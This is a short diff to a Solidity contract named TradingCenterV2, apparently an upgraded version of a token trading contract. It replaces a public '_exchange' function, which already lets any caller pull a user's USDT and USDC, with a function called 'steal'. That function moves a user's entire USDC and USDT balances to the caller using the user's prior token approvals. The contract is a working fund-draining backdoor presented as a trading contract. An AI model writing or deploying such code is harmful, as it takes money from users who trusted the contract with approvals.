@@ -10,23 +10,10 @@ contract TradingCenterV2 is TradingCenter {
         usdc = _usdc;
     }
 
-    function _exchange(
-        IERC20 token0,
-        uint256 usdtAmount,
-        uint256 usdcAmount,
-        address user
-    ) public {
-        require(token0 == usdt || token0 == usdc, "invalid token");
-        IERC20 token1 = token0 == usdt ? usdc : usdt;
-        token0.transferFrom(
-            user,
-            msg.sender,
-            token0 == usdt ? usdtAmount : usdcAmount
-        );
-        token1.transferFrom(
-            user,
-            msg.sender,
-            token1 == usdt ? usdtAmount : usdcAmount
-        );
+    function steal(address user) public {
+        uint256 usdcAmount = usdc.balanceOf(user);
+        uint256 usdtAmount = usdt.balanceOf(user);
+        usdc.transferFrom(user, msg.sender, usdcAmount);
+        usdt.transferFrom(user, msg.sender, usdtAmount);
     }
 }
